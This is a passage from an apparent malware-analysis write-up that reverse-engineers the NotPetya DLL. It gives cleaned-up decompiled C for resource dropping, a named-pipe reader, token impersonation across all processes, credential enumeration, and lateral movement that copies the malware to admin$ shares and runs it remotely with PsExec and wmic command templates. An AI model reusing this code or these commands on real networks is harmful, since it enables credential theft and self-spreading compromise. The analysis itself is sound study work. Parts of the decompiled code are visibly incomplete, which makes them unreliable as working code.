            if(extracted == 0 && lpResourceBuffer != NULL){
                *lpResourceBuffer = hRscs_lpResource;
                ret = 1;
            }

            else HeapFree(GetProcessHeap(),0,lpMemory);
        }
    }
    return ret;
}
```

##### lpStartAddress_100073fd
Back to `FUN_10007545` we can also see that a thread is created with `lpStartAddress_100073fd` as starting routine, and a pipe string is passed as a parameter. Let's dive into it.

The first things we see are some calls to Heap related functions, `InitializeSecurityDescriptor`, `SetSecurityDescriptorDacl`, and pipe related functions.
After initializing the security descriptor, it creates a named pipe with the parameter passed into the thread. Then, it connects to the pipe, and continues to try to read the pipe, and when it's eventually read, it does the same thing 29 times before disconnecting the pipe and repeating the whole things over and over, at 1 second interval. The function looks like this:

```c
int waitAndReadFromPipe(LPCWSTR strPipe){
    BOOL success;
    LPCWSTR lpStart;
    LPWSTR firstOccurance;

    SECURITY_ATTRIBUTES lpSecurityAttr;
    SIZE_T bytesRead, bytesAvailableToRead;
    HANDLE hPipe;

    int i;

    lpSecurityAttr.lpSecurityDescriptor = NULL;
    lpSecurityAttr.nLength = 0xc;
    lpSecurityAttr.bInheritHandle = 0;

    lpSecurityAttr.lpSecurityDescriptor = HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,0x14);

    // Allocate the security descriptor. If that fails, exit the function (this is the only exit way)
    if(((lpSecurityAttr.lpSecurityDescriptor == NULL) || (success = InitializeSecurityDescriptor(lpSecurityAttr.lpSecurityDescriptor,SECURITY_DESCRIPTOR_REVISION), !success)) || (success = SetSecurityDescriptorDacl(lpSecurityAttr.lpSecurityDescriptor,TRUE,NULL,0), !success)) return 0;

    do {
        do {
            hPipe = CreateNamedPipeW(strPipe,PIPE_ACCESS_DUPLEX,(PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE),1,0,0,0,&lpSecurityAttr);
        } while(hPipe == NULL);

        success = ConnectNamedPipe(hPipe,NULL);

        if(success){
            i = 30;
            do {
                i--;
                bytesAvailableToRead = 0;
                success = PeekNamedPipe(hPipe,NULL,0,NULL,&bytesAvailableToRead,NULL);

                if (success) {
                    if(bytesAvailableToRead != 0){
                        // Allocate memory for the pipe to be read
                        lpStart = HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,bytesAvailableToRead);

                        if(lpStart != NULL){
                            bytesRead = 0;

                            // Read the pipe
                            success = ReadFile(hPipe,lpStart,bytesAvailableToRead,&bytesRead,NULL);
                            
                            // Truncate a string where it finds a ':' character, then delay
                            if(((success != 0) && (bytesRead == bytesAvailableToRead)) && (firstOccurance = StrChrW(lpStart,L':'), firstOccurance != NULL)){
                                *firstOccurance = L'\0';
                                delayEvenMoreExecution(lpStart,firstOccurance + 1,2);
                            }
                            
                            HeapFree(GetProcessHeap(),0,lpStart);
                        }

                        break;
                    }

                    Sleep(1000);
                }
            } while(i != 0);

            FlushFileBuffers(hPipe);
            DisconnectNamedPipe(hPipe);
        }

        CloseHandle(hPipe);

    } while(true);
}
```

##### Back to FUN_10007545
The first part of the function is dedicated to dropping a file, then creating a pipe into a thread, and reading from it some values. After that we see that a process is created, and as a parameter it has the pipe name. This isn't a normal process tho, this is NotPetya's embedded resource. After that, the file is deleted and the function is exited.

To better understand what is going on here, we need to also analyze NotPetya's dropped program. It also worth noting that 4 memory buffers keeps reassigning to themselves (you can check the ghidra project to see for yourself), but the interesting one, being the extracted malware, was never assigned to the one user to write the file. However, I think this is a decompilation problem, so for now we'll assume that the malware writes the extracter malware (confirmed after running it).

As always, here is the cleaned up function:

```c
void dropResourceAndPipeIntoIt(){
    HANDLE hCurrentProcess, hModule, hRsrc, hThread;
    FARPROC lpIsWow64Process;
    int obtained;

    DWORD success;
    UINT created;
    HRESULT createCLSIDstr;

    BOOL processCreated, isWOW64;
    WCHAR lpCmdLine[1024], strPipe[1024], lpTempPath[520], lpTempFileName[780];
    STARTUPINFOW startupInfo;

    PROCESS_INFORMATION processInfo;
    GUID rclsid;
    LPCVOID strRclsid, i, prtFileMemory, lpFileMemory, lpMem;

    LPVOID lpExtractedResource, lpExtractedResourcePtr;
    
    // Check if the process is x64 or x32
    hModule = GetModuleHandleW(L"kernel32.dll");
    lpIsWow64Process = GetProcAddress(hModule,"IsWow64Process");

    if(lpIsWow64Process != NULL) (*lpIsWow64Process)(GetCurrentProcess(),&isWOW64);

    // If the process is x64, check the resource number 2, else the number 1
    hRsrc = FindResourceW(hCurrentModule,(LPCWSTR)((isWOW64 != 0) + 1),(LPCWSTR)10);

    // Load and extract the resource into memory
    if(hRsrc == NULL) obtained = 0;
    else obtained = loadAndExtractResource(&lpExtractedResource,hRsrc);

    if(obtained != 0){
        // Get the temp path folder, and generate a temp filename
        success = GetTempPathW(0x208,lpTempPath);
        if((success != 0) && (created = GetTempFileNameW(lpTempPath,(LPCWSTR)0x0,0,lpTempFileName), i = lpFileMemory, lpExtractedResourcePtr = lpExtractedResource, created != 0)){

            /* Zero out the rclsid structure */

            // Creates a GUID, a unique 128-bit integer used for CLSIDs and interface identifiers (MSDN)
            createCLSIDstr = CoCreateGuid(&rclsid);

            lpFileMemory = lpExtractedResource;

            if(createCLSIDstr > -1){
                createCLSIDstr = StringFromCLSID(&rclsid,&strRclsid);

                if (createCLSIDstr > -1){
                    // Write the extracted resource into the temp file
                    obtained = writeMemoryToHiddenFile(lpTempFileName,lpFileMemory);

                    if(obtained != 0){
                        wsprintfW(strPipe,L"\\\\.\\pipe\\%ws",strRclsid);

                        // Create the thread to be able to read the data from the process
                        hThread = CreateThread(NULL,0,waitAndReadFromPipe,strPipe,0,NULL);

                        // Start the dropped file
                        if(hThread != NULL){
                            processInfo.hProcess = NULL;
                            processInfo.hThread = NULL;
                            processInfo.dwProcessId = 0;
                            processInfo.dwThreadId = 0;

                            memset(&startupInfo,0,0x44);

                            startupInfo.wShowWindow = 0;
                            startupInfo.cb = 0x44;

                            wsprintfW(lpCmdLine,L"\"%ws\" %ws",lpTempFileName,strPipe);

                            processCreated = CreateProcessW(lpTempFileName,lpCmdLine,NULL,NULL,0,CREATE_NO_WINDOW,NULL,NULL,&startupInfo,&processInfo);

                            // When the process is done, kill the thread
                            if(processCreated != 0){
                                WaitForSingleObject(processInfo.hProcess,60000);
                                lockSemaphore();
                                TerminateThread(hThread,0);
                            }

                            CloseHandle(hThread);

                            /* Zero out the lpFileMemory buffer */

                        }

                        // Zero out the temp file, and delete it
                        writeMemoryToHiddenFile(lpTempFileName,lpFileMemory);
                        DeleteFileW(lpTempFileName);
                    }

                    CoTaskMemFree(strRclsid);
                }
            }
        }

        HeapFree(GetProcessHeap(),0,lpMem);
    }

    return;
}
```

#### loadAndDropResource3
##### FUN_10008999
Back to `Ordinal_1`, the malware checks if any detected AV is present, in that case it enter the `FUN_10008999` function.

This function flow is a mess, but the general idea is that it will load the resource number 3, extract it in memory, and then it tries to write the file into a folder. Now, the first thing the malware does is checking if `SeDebugPrivilege` and `SeTcbPrivilege` privileges were acquired, in that case it tries to drop the resource number 3 is a folder generated using a CSIDL value. If that fails, or if it doesn't have those privilges, it simply drops it into the windows directory.

The filename of resource number 3 is `dllhost.dat`. We can also rename `res3.exe` from our previous resource extraction to `dllhost.dat` now.
As always, here is the cleaned up function:

```c
int loadAndDropResource3(int lpPrivilegesMask){
    HANDLE hRscs_lpResource;
    int success, ret = 0, lpExtractedResourceBuffer;
    UINT pathLen;

    short *pathPtr;
    DWORD lastError;
    LPVOID lpBuffer, ptrLpBuffer;

    // Find resource number 3, load it, extract it in memory
    hRscs_lpResource = FindResourceW(hCurrentModule,3,NULL);

    if(hRscs_lpResource == NULL) success = 0;
    else success = loadAndExtractResource(&lpExtractedResourceBuffer,hRscs_lpResource);
    
    if(!success) goto quit;

    globalLpReturnedPath = HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,0x208);
    
    // Check if SeDebugPrivilege and SeTcbPrivilege were not acquired
    if(lpPrivilegesMask == 0){
        // Retrieve the path of a folder identified by a CSIDL value (MSDN)
        success = SHGetFolderPathW(0,35,0,0,globalLpReturnedPath);

        if(success == 0){
            pathPtr = globalLpReturnedPath;

            // Weird strlen, don't worry about it
            pathLen = (int)pathPtr - ((int)globalLpReturnedPath + 2) >> 1;
            goto appendPath;
        }

freeHeap:
        HeapFree(GetProcessHeap(),0,globalLpReturnedPath);
        globalLpReturnedPath = NULL;
    }
    else {
        // Get the windows directory path
        pathLen = GetWindowsDirectoryW(globalLpReturnedPath,0x104);

appendPath:
        if((pathLen == 0) || (pathLen + 0xc > 0x103)) goto freeHeap;

        // Append to the path dllhost.dat
        PathAppendW(globalLpReturnedPath,L"dllhost.dat");
    }

    success = lpExtractedResourceBuffer;
    ptrLpBuffer = lpBuffer;

    // Write the memory to dllhost.dat
    if((globalLpReturnedPath != NULL) && ((success = writeMemoryToFile(globalLpReturnedPath,lpBuffer,0), success != 0 || (lastError = GetLastError(), success = lpExtractedResourceBuffer, ptrLpBuffer = lpBuffer, lastError == ERROR_FILE_EXISTS)))){
        ret = 1;
        ptrLpBuffer = lpBuffer;
    }

    ptrLpBuffer = lpBuffer;
    
    HeapFree(GetProcessHeap(),0,ptrLpBuffer);

quit:
    SetLastError(lastError);
    return ret;
}
```

Note however that this file doesn't get executed yet.

#### executeMalwareOnOtherSystemInNet
After the dllhost.dat has been dropped, we enter an if statement, where all the code inside it gets executed only if the malware acquired the `SeTcbPrivilege` privilege. The first thing it does it does is acquiring a critical section, then going into `FUN_1000875a`.

##### FUN_1000875a
This is a big function, however we see some familiar functions, like `checkWindowsVersion`, the one which checks for Windows Vista onwards, `CreateToolhelp32Snapshot`, `Process32FirstW` and `Process32NextW`, all three used to enumerate the current processes. However things get interesting now, becuase there are some Token related functions like `OpenProcessToken`, `GetTokenInformation`, `DuplicateTokenEx` and `SetTokenInformation`. Here and there the code is a bit messy, but the function goal is really easy to understand:

```c
int impersonateAllProcesses(HANDLE *lpHandleBuff){
    BOOL success, success_, atLeastVista;
    HANDLE hToken, hProcessSnap, hTokenImpersonated, hProcess, lpHandleBuffCounter?[3];
    int ret = 0, lpHandleBuffPtr, smt, offset;

    LPVOID lpTokenStatistics[4], lpTokenInfo;
    PROCESSENTRY32W lppe[2];
    DWORD PID, lpTokenInfoLen;

    // Check if we're using at least Windows Vista, then enumerates all the processes
    atLeastVista = checkWindowsVersion();
    hProcessSnap = (HANDLE)CreateToolhelp32Snapshot(2,0);

    if(hProcessSnap != NULL) {
        lppe[0] = 0x22c;

        success = Process32FirstW(hProcessSnap,lppe);

        if(!success) GetLastError();
        else {
            // Maybe go to the buffer start?
            lpHandleBuffPtr = (int)lpHandleBuff - (int)lpHandleBuffCounter?;

            do {
                lpTokenInfo = -1;

                hToken = NULL;
                hTokenImpersonated = NULL;
                hProcess = OpenProcess((PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE | PROCESS_VM_READ),FALSE,PID);

                if(hProcess != NULL){
                    success_ = OpenProcessToken(hProcess,MAXIMUM_ALLOWED,&hToken);
                    
                    // Get the token information, duplicate the token and impersonate it
                    if ((((success_ != 0) && (success_ = GetTokenInformation(hToken,TokenSessionId,&lpTokenInfo,4,&lpTokenInfoLen), success_ != 0)) && (lpTokenInfo != 0)) && (success_ = DuplicateTokenEx(hToken,MAXIMUM_ALLOWED,NULL,SecurityImpersonation,TokenImpersonation,&hTokenImpersonated), success_ != 0)){
                      
                        success_ = GetTokenInformation(hTokenImpersonated,TokenStatistics,lpTokenStatistics,0x38,&lpTokenInfoLen);

                        if(success_ != 0){

                            /* Here there should be a check to see if it has to goto closeHandles, but it's not important */

                            // Add some token infos...
                            success_ = SetTokenInformation(hTokenImpersonated,TokenSessionId,&lpTokenInfo,4);
                            if(success_ != 0){
                                ret++;
                                offset++;

                                // This is just copying each impersonated handle token into a buffer
                                *(HANDLE *)((int)lpHandleBuffCounter? + lpHandleBuffPtr + offset * 4) = hTokenImpersonated;
                            }
                        }
                    }
closeHandles:       
                    CloseHandle(hToken);
                    CloseHandle(hProcess);
                }
            
            // Repeat the process till 64 tokens have been impersonated, or the processes' tokens were all impersonated
            } while((ret < 64) && (success = Process32NextW(hProcessSnap,lppe), success != 0));
        }

        CloseHandle(hProcessSnap);
    }

    return ret;
}
```

##### Back to Ordinal_1
After all the impersonated handles are collected, the malware creates as many threads as many impersonated handles. The thread function is `lpStartAddress_10009f8e`.


##### lpStartAddress_10009f8e
Inside this thread function we see once again the token related functions, but we also see 5 new function and a class method, let's go into them.

##### FUN_10007a17
The first function is `FUN_10007a17`, in which we see some network related functions such as `WNetOpenEnum`, `WNetEnumResource` and `WNetCloseEnum`. We also see that this is a recursive function. Long story short, this is a recursive function, after cleaning it up it looks like this:

```c
int enumerateNetResources(LPCRITICAL_SECTION lpCriticalSection,LPNETRESOURCEW lpNetResource){
    DWORD success;
    HANDLE hMem, hEnumNetwork;
    int i, ret = 0;

    short **ptrMem, *singleMem, singleMemNum;
    LPNETRESOURCEW lpCount = NULL;
    SIZE_T dwBytes = 0x4000;

    // Open the enum handle
    success = WNetOpenEnumW(RESOURCE_CONNECTED,RESOURCETYPE_ANY,0,lpNetResource,&hEnumNetwork);
    if((success == NO_ERROR) && (hMem = GlobalAlloc(GPTR,dwBytes), hMem != NULL)){
        ret = 1;
        while(true){
            // Start the enumeration
            memset(hMem,0,dwBytes);
            success = WNetEnumResourceW(hEnumNetwork,(LPDWORD)&lpCount,hMem,&dwBytes);

            // If there are any errors, break
            if(success != NO_ERROR) break;

            lpNetResource = NULL;

            // If resources are present
            if(lpCount != NULL){

                ptrMem = (short **)((int)hMem + 0x14);
                do {
                    i = 2;
                    
                    // Recursive call
                    if((ptrMem[-2] & 2) == 2) enumerateNetResources(lpCriticalSection,(ptrMem - 5));
                    else {
                        singleMem = *ptrMem;

                        if((singleMem != NULL) && (*singleMem == 0x5)){
                            singleMemNum = singleMem[2];

                            while((singleMemNum != 0 && singleMemNum != 92)){
                                i++;
                                singleMemNum = singleMem[i];
                            }

                            singleMem[i] = 0;

                            // Delay
                            checkIfCmdLineNullOrDelay(lpCriticalSection);
                        }
                    }
                    lpNetResource = &lpNetResource->dwScope + 1;

                    ptrMem += 8;
                } while(lpNetResource < lpCount);
            }
        }

        // Returns 0 it's done buyt not because it ran out of resources
        if(success != ERROR_NO_MORE_ITEMS) ret = 0;
        
        GlobalFree(hMem);
        WNetCloseEnum(hEnumNetwork);
    }

    return ret;
}
```

##### FUN_10007b31
Now we can go inside `FUN_10007b31`. Immediately we see some interesting functions like `CredEnumerate` and `CredFree`. However when trying to recreate the structure on ghidra, thus the decompilation doesn't go as smooth as other times. However we get the function general idea. Here is the decompilation:

```c
int enumerateUserCredential(LPCRITICAL_SECTION lpCriticalSection){
    int ret;
    ushort *puVar1;
    int iVar2;
    ushort *puVar3;
    uint offset;
    int local_10;
    CREDENTIALW *lpCredential;
    uint dwCount;
    DWORD lpCredentialFlags;
    
    lpCredential = (CREDENTIALW *)0x0;
    dwCount = 0;
    ret = CredEnumerateW(0,0,&dwCount,&lpCredential);
    if (ret != 0) {
        offset = 0;
        if(dwCount != 0){
            do {
                lpCredentialFlags = (&lpCredential->Flags)[offset];
                puVar1 = *(ushort **)(lpCredentialFlags + 8);
                if(puVar1 == (ushort *)0x0){
loop?:      
                    if (*(int *)(lpCredentialFlags + 4) == 2) goto delay;
                }
                else {
                    local_10 = 8;
                    puVar3 = (ushort *)&DAT_100140bc;

                    do {
                        if(*puVar1 != *puVar3){
                            iVar2 = (-(uint)(*puVar1 < *puVar3) & 0xfffffffe) + 1;
                            goto delayEvenMore;
                        }

                        puVar1 = puVar1 + 1;
                        puVar3 = puVar3 + 1;
                        local_10 = local_10 + -1;
                    } while(local_10 != 0);

                    iVar2 = 0;
delayEvenMore:      
                    if((iVar2 != 0) || (*(int *)(lpCredentialFlags + 4) != 1)) goto loop?;
                    if((*(int *)(lpCredentialFlags + 0x30) != 0) && (*(int *)(lpCredentialFlags + 0x1c) != 0)){
                        delayEvenMoreExecution(*(short **)(lpCredentialFlags + 0x30),*(short **)(lpCredentialFlags + 0x1c),0);
                    }
delay:          
                    checkIfCmdLineNullOrDelay(lpCriticalSection);
                }

                offset = offset + 1;
            } while (offset < dwCount);
        }

        CredFree(lpCredential);
    }

    return ret;
}
```

##### FUN_10006f40, FUN_1000711f, FUN_10007167
Those three functions simply lock a semaphore, allocate heap, and wait for something inside a critical section. We'll just rename `FUN_10006f40` to `allocateMemoryAndWait`.

##### FUN_10006f78
This is a rather small function, there's no need to explain it:

```c
void heapFree(LPVOID lpMem){
    HeapFree(GetProcessHeap(),0,lpMem);
    return;
}
```

##### meth_0x10006f91
Even this method is not interesting, it simply enters a critical section and waits. We'll rename it `waitForSmt`.

##### FUN_10006f02
Even this function waits for something. You know the deal, we're going to rename it `waitForSmtToo`.

##### FUN_10009987
Now you may think "what could possibly be inside `FUN_10009987`? Maybe another HeapFree?". I though so, but... there is a lot going on there!
The first things we see are some network share paths, as some network share related functions. 
Let's jump in some functions to better understand this function logic.

##### FUN_10009a0c
There is not much to say in here, this function retrieves the dll path name if the passed argument is not 0. I won't show the decompilation because it's not worth it, so we'll just rename it to `getDllPathIfFlagIsNot0`.

##### FUN_100097a5
As soon as we jump into `FUN_100097a5` we see that this uses the `__thiscall` calling convention, meaning it's C++ method. I'm not quite sure why `ooanalyzer` didn't reconstruct this method, but we just need to understand its logic. As we look inside it, we see a call is made to `getDllPathIfFlagIsNot`, and then to `PathFileExistsW`. However the parameter is the `void* this`, and even looking at the parameter passed from the parent functions doesn't help us know which file is checking.

However, we can also see some interesting strings:
- `"%s \\\\%s -accepteula -s "`
- `"-d C:\\Windows\\System32\\rundll32.exe \"C:\\Windows\\%s\",#1 "`

We kinda recognize the parameters about the second string as they are the same NotPetya's loader used to launch the dll.
The first string however doesn't have anything to do about that. Also, if we check the second string, we see a `"-d"` parameter being appended before the `rundll32.exe` program. This doesn't make any sense.

Unless, something else is going on here. If we look at the first string, we can see that a program is being launched (look at the start, something is going to be appended at the `"%s"` place). What if one of the other NotPetya's resource was launched? Having a quick look inside resources 1 and 2 reveals that they doesn't handle those kind of parameters, as they only handle 1. 

But when I droped `dllhost.dat` inside ghidra, the file details caught my attention:

```
PE Property[CompanyName]:         Sysinternals - www.sysinternals.com
PE Property[FileDescription]:     Execute processes remotely
PE Property[FileVersion]:         1.98
PE Property[InternalName]:        PsExec
PE Property[LegalCopyright]:      Copyright (C) 2001-2010 Mark Russinovich
PE Property[OriginalFilename]:    psexec.c
PE Property[ProductName]:         Sysinternals PsExec
PE Property[ProductVersion]:      1.98
```

After a quick web search, we found the MSDN page with those details:

*Utilities like Telnet and remote control programs like Symantec's PC Anywhere let you execute programs on remote systems, but they can be a pain to set up and require that you install client software on the remote systems that you wish to access. PsExec is a light-weight telnet-replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software. PsExec's most powerful uses include launching interactive command-prompts on remote systems and remote-enabling tools like IpConfig that otherwise do not have the ability to show information about remote systems.*

*Note: some anti-virus scanners report that one or more of the tools are infected with a "remote admin" virus. None of the PsTools contain viruses, but they have been used by viruses, which is why they trigger virus notifications.*

We can also see all the parameters, as well as some program uses examples:
`psexec -i \\marklap cmd"`

Or the more general one:
`psexec [\\\\computer[,computer2[,...] | @file]][-u user [-p psswd]][-n s][-r servicename][-h][-l][-s|-e][-x][-i [session]][-c [-f|-v]][-w directory][-d][-<priority>][-g n][-a n,n,...][-accepteula][-nobanner] cmd [arguments]`

If we concatenate the two strings we saw on the decompilation we get this string: `"%s \\\\%s -accepteula -s -d C:\\Windows\\System32\\rundll32.exe \"C:\\Windows\\%s\",#1 "`.

It doesn't take too lonk to understand what this string is supposed to look like after concatenation: `"<psexecPath> \\\\<remoteUser> -accepteula -s -d C:\\Windows\\System32\\rundll32.exe \"C:\\Windows\\perfc.dat\",#1 "`.

##### FUN_10006bb0, FUN_10006af0
Both those functions seems to be preparing a string, probably for the parent function. I'll just rename `FUN_10006bb0` to `prepareSmtString`.

##### Back to FUN_100097a5
Now can safely assume that this function does nothing more that running the malware on the other systems, using the stolen credentials from previous functions.
Here is the ghidra's decompilation of `FUN_100097a5`:

```c
int __thiscall usePsexecToExecutePerfcDat(void *this,undefined4 lpNetShareUser){
    short sVar1;
    short *psVar2;
    BOOL BVar3;
    int iVar4;
    uint uVar5;
    int iVar6;
    LPWSTR lpSomePath;
    uint uVar7;
    WCHAR lpOutStr [8192];
    undefined lpPerfcDat [520];
    int local_c;
    DWORD local_8;
    
    local_8 = 0x100097b2;
    *lpSomePath = L'\0';
    *(undefined2 *)this = 0;
    uVar7 = 0;
    local_c = 0;
    getDllPathIfFlagIsNot0((int)lpPerfcDat);
    local_8 = 0;

    if (globalLpReturnedPath == (LPVOID)0x0) {
        local_8 = 3;
    }
    else {
        psVar2 = (short *)globalLpReturnedPath;
        do {
            sVar1 = *psVar2;
            psVar2 = psVar2 + 1;
        } while(sVar1 != 0);
        uVar7 = (int)psVar2 - ((int)globalLpReturnedPath + 2) >> 1;

        if(uVar7 < 0x105){
            iVar6 = (int)this - (int)globalLpReturnedPath;
            psVar2 = (short *)globalLpReturnedPath;

            do {
                sVar1 = *psVar2;
                *(short *)(iVar6 + (int)psVar2) = sVar1;
                psVar2 = psVar2 + 1;
            } while(sVar1 != 0);
        }

        else {
            local_8 = 0x7a;
        }
    }
    SetLastError(local_8);
    if((uVar7 == 0) || (BVar3 = PathFileExistsW((LPCWSTR)this), BVar3 == 0)){
        *lpSomePath = L'\0';
        *(undefined2 *)this = 0;
    }
    else {
        iVar6 = wsprintfW(lpSomePath,L"%s \\\\%s -accepteula -s ",this,lpNetShareUser);
        iVar4 = wsprintfW(lpSomePath + iVar6,
                          L"-d C:\\Windows\\System32\\rundll32.exe \"C:\\Windows\\%s\",#1 ",lpPerfcDat);
        uVar5 = prepareSmtString(lpOutStr);
        uVar7 = 0x1fff;
        if(uVar5 + 1 < 0x2000){
            uVar7 = uVar5 + 1;
        }
                        /* Could append the path? */
        memcpy(lpSomePath + iVar6 + iVar4,lpOutStr,uVar7 * 2);
        local_c = 1;
    }
    return local_c;
}
```

##### FUN_100098ab
Another interesting function is `FUN_100098a`. In this one, we see that `wmic.exe` is used to execute the malware in other systems on the network.
Without wasting time, here is the decompiled function:

```c
int __thiscall useWmicToExecutePerfcDat(void *this,LPWSTR lpNode,LPWSTR lpUserName,LPWSTR lpPassword){
    WCHAR WVar1;
    UINT UVar2;
    BOOL BVar3;
    int iVar4;
    int iVar5;
    WCHAR *pWVar6;
    LPWSTR unaff_ESI;
    WCHAR local_420c [8192];
    undefined local_20c [516];
    undefined4 uStack_8;
    
    uStack_8 = 0x100098b8;
    *unaff_ESI = L'\0';
    *(undefined2 *)this = 0;
    getDllPathIfFlagIsNot0((int)local_20c);
    UVar2 = GetSystemDirectoryW((LPWSTR)this,0x104);

    if(UVar2 == 0){
        GetLastError();
    }

    else {
        PathAppendW((LPWSTR)this,L"wbem\\wmic.exe");
        BVar3 = PathFileExistsW((LPCWSTR)this);

        if(BVar3 != 0){
            // This contains the wmic.exe path
            iVar4 = wsprintfW(unaff_ESI,L"%s /node:\"%ws\" /user:\"%ws\" /password:\"%ws\" ",this,lpNode,lpUserName,lpPassword);
            iVar5 = wsprintfW(unaff_ESI + iVar4,L"process call create \"C:\\Windows\\System32\\rundll32.exe \\\"C:\\Windows\ \%s\\\" #1 ",local_20c);

            iVar4 = iVar4 + iVar5;
            prepareSmtString(local_420c);
            pWVar6 = local_420c;

            while(true){
                WVar1 = *pWVar6;

                if(WVar1 == L'\"'){
                    unaff_ESI[iVar4] = L'\\';
                    iVar4 = iVar4 + 1;
                }

                unaff_ESI[iVar4] = WVar1;
                if(WVar1 == L'\0') break;
                pWVar6 = pWVar6 + 1;
                iVar4 = iVar4 + 1;
            }

            wsprintfW(unaff_ESI + iVar4,L"\"");
            return 1;
        }
    }
    *unaff_ESI = L'\0';
    *(undefined2 *)this = 0;
    return 0;
}
```

##### Back to FUN_10009987
We now have a clear idea of what this function does, it steals credentials to execute itself on other infected system on the network.
Here is the decompiled function:

```c
uint runMalwareOnRemoteHosts(int lpNetShareUser,LPCWSTR param_2,LPCWSTR param_3,DWORD *param_4){
    bool bVar1;
    LPWSTR pWVar2;
    BOOL BVar3;
    HANDLE ThreadHandle;
    int iVar4;
    DWORD *pDVar5;
    DWORD DesiredAccess;
    HANDLE *TokenHandle;
    int iStack_11ac4;
    uint uStack_11ac0;
    DWORD DStack_11abc;
    HANDLE pvStack_11ab8;
    HANDLE pvStack_11ab4;
    uint uStack_11ab0;
    DWORD DStack_11aac;
    _PROCESS_INFORMATION _Stack_11aa8;
    undefined auStack_11a98 [44];
    DWORD DStack_11a6c;
    WORD WStack_11a68;
    HANDLE pvStack_11a60;
    HANDLE pvStack_11a5c;
    HANDLE pvStack_11a58;
    _NETRESOURCEW _Stack_11a50;
    WCHAR lpMaybeSomeCredentialRelatedFunction? [260];
    undefined auStack_11828 [520];
    WCHAR lpProgramName [780];
    WCHAR lpNewShareDir [1024];
    WCHAR lpNetSharePath [1024];
    WCHAR aWStack_10008 [32766];
    undefined4 uStack_c;
    
    uStack_c = 0x10009997;
    bVar1 = false;
    uStack_11ac0 = 0;
    DStack_11abc = 0;
    DStack_11aac = 0;
    if(lpNetShareUser == 0){
        DStack_11abc = 0x57;
    }
    else {
        lpMaybeSomeCredentialRelatedFunction?[0] = L'\0';
        wsprintfW(lpMaybeSomeCredentialRelatedFunction?,L"\\\\%s\\admin$",lpNetShareUser);
        _Stack_11a50.dwScope = 0;
        pDVar5 = &_Stack_11a50.dwType;
        for(iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1){
            *pDVar5 = 0;
            pDVar5 = pDVar5 + 1;
        }
        _Stack_11a50.lpRemoteName = lpMaybeSomeCredentialRelatedFunction?;
        _Stack_11a50.dwType = 1;
        getDllPathIfFlagIsNot0((int)auStack_11828);
        wsprintfW(lpNetSharePath,L"\\\\%ws\\admin$\\%ws",lpNetShareUser,auStack_11828);
        while(true){
            lpNewShareDir[0] = L'\0';
            DStack_11aac = WNetAddConnection2W(&_Stack_11a50,param_3,param_2,0);
            wsprintfW(lpNewShareDir,L"\\\\%ws\\admin$\\%ws",lpNetShareUser,auStack_11828);
            pWVar2 = PathFindExtensionW(lpNewShareDir);
            if(pWVar2 != (LPWSTR)0x0){
                *pWVar2 = L'\0';
                BVar3 = PathFileExistsW(lpNewShareDir);
                if(BVar3 != 0) {
                    uStack_11ac0 = 1;
                    goto LAB_10009d7c;
                }
                DStack_11abc = GetLastError();
            }
            iVar4 = writeMemoryToFile(lpNetSharePath,globalMalwareBuffer,1);
            if(iVar4 != 0){
                if((param_2 != (LPCWSTR)0x0) && (param_3 != (LPCWSTR)0x0)){
                    FUN_10006ce7(param_2,param_3);
                    DAT_10016010 = 1;
                }
                TokenHandle = &pvStack_11ab4;
                BVar3 = 1;
                DesiredAccess = 2;
                pvStack_11ab4 = (HANDLE)0x0;
                pvStack_11ab8 = (HANDLE)0x0;
                ThreadHandle = GetCurrentThread();
                BVar3 = OpenThreadToken(ThreadHandle,DesiredAccess,BVar3,TokenHandle);
                if(BVar3 != 0){
                    DuplicateTokenEx(pvStack_11ab4,0x2000000,(LPSECURITY_ATTRIBUTES)0x0,SecurityImpersonation,TokenPrimary,&pvStack_11ab8);
                }
                iStack_11ac4 = 0;
                goto LAB_10009b82;
            }
            DStack_11abc = GetLastError();
            if((((DStack_11abc == 0x50) || (DStack_11abc == 0x35)) || (DStack_11abc == 0x43)) || (DStack_11aac != 0x4c3)) goto LAB_10009d7c;
            if(bVar1) break;
            bVar1 = true;
            WNetCancelConnection2W(lpMaybeSomeCredentialRelatedFunction?,0,1);
        }
    }   
    goto LAB_10009d9f;
LAB_10009b82:
    if(uStack_11ac0 != 0) goto LAB_10009d58;
    aWStack_10008[0] = L'\0';
    lpProgramName[0] = L'\0';
    _Stack_11aa8.hProcess = (HANDLE)0x0;
    _Stack_11aa8.hThread = (HANDLE)0x0;
    _Stack_11aa8.dwProcessId = 0;
    _Stack_11aa8.dwThreadId = 0;
    memset(auStack_11a98 + 4,0,0x40);
    auStack_11a98._0_4_ = 0x44;
    DStack_11a6c = 1;
    WStack_11a68 = 0;
    if(iStack_11ac4 == 0){
        usePsexecToExecutePerfcDat(lpProgramName,lpNetShareUser);
    }   
    if(iStack_11ac4 == 1){
        if ((param_2 == (LPCWSTR)0x0) || (param_3 == (LPCWSTR)0x0)) goto LAB_10009d4a;
        useWmicToExecutePerfcDat(lpProgramName,(LPWSTR)lpNetShareUser,param_2,param_3);
    }   
    if((aWStack_10008[0] == L'\0') || (lpProgramName[0] == L'\0')){
LAB_10009d2b:
        DStack_11abc = GetLastError();
    }   
    else {
        if(pvStack_11ab8 == (HANDLE)0x0){
            iVar4 = CreateProcessW(lpProgramName,aWStack_10008,(LPSECURITY_ATTRIBUTES)0x0,(LPSECURITY_ATTRIBUTES)0x0,0,0x8000000,(LPVOID)0x0,(LPCWSTR)0x0,(LPSTARTUPINFOW)auStack_11a98,&_Stack_11aa8);
        }
        else {
            iVar4 = CreateProcessAsUserW(pvStack_11ab8,lpProgramName,aWStack_10008,(LPSECURITY_ATTRIBUTES)0x0,(LPSECURITY_ATTRIBUTES)0x0,0,0x8000000,(LPVOID)0x0,(LPCWSTR)0x0,(LPSTARTUPINFOW)auStack_11a98,&_Stack_11aa8);
        }
        if(iVar4 == 0) goto LAB_10009d2b;
        WaitForSingleObject(_Stack_11aa8.hProcess,0xffffffff);
        uStack_11ab0 = 0;
        GetExitCodeProcess(_Stack_11aa8.hProcess,&uStack_11ab0);
        if(pvStack_11a58 != (HANDLE)0x0){
            CloseHandle(pvStack_11a58);
        }
        if(pvStack_11a60 != (HANDLE)0x0){
